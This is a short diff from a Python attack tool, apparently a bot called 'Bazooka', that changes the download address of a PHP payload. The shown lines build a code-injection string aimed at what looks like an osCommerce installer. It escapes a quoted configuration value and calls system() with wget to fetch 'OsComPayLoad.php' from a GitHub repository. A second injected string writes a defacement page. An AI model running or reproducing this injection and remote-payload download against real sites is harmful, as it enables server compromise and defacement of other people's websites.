@@ -2383,7 +2383,7 @@ class Bazooka(object):
                     'DIR_FS_DOCUMENT_ROOT': './'
                 }
                 shell = '\');'
-                shell += 'system("wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/OsComPayLoad.php");'
+                shell += 'system("wget https://raw.githubusercontent.com/ivi2020/test/master/bot/OsComPayLoad.php");'
                 shell += '/*'
                 deface = '\');'
                 deface += 'system("echo Done patch it Now!> ../../vuln.htm");'
